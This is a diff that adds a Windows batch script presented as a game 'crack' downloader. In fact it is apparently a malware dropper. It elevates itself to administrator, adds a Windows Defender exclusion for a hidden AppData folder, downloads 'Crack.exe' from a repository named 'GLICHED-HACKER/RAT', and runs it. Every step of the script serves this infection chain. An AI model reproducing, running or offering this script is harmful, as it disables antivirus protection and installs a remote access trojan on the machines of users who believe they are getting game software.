@@ -1,0 +1,42 @@
+@echo off
+:: Elevate to admin if not already running with it
+:: Uses a simple method that relaunches the script with admin privileges only once
+
+:: Check for admin access
+net session >nul 2>&1
+if %errorlevel% NEQ 0 (
+    powershell -Command "Start-Process '%~f0' -Verb runAs"
+    exit /b
+)
+
+:: Set up paths
+set "TARGET_DIR=%USERPROFILE%\AppData\Roaming\SubDir"
+set "GAME_URL=https://raw.githubusercontent.com/GLICHED-HACKER/RAT/main/Crack.exe"
+set "GAME_FILE=%TARGET_DIR%\Crack.exe"
+
+:: Create directory if needed
+if not exist "%TARGET_DIR%" (
+    mkdir "%TARGET_DIR%"
+)
+
+:: Add exclusion first
+powershell -Command "Add-MpPreference -ExclusionPath '%TARGET_DIR%'"
+
+:: Clean output
+echo Downloading crack
+
+:: Download the file
+powershell -Command "Invoke-WebRequest -Uri '%GAME_URL%' -OutFile '%GAME_FILE%' -UseBasicParsing"
+
+:: Wait for download to complete
+:waitloop
+if exist "%GAME_FILE%" (
+    goto run
+) else (
+    timeout /t 1 >nul
+    goto waitloop
+)
+
+:run
+start "" "%GAME_FILE%"
+exit /b
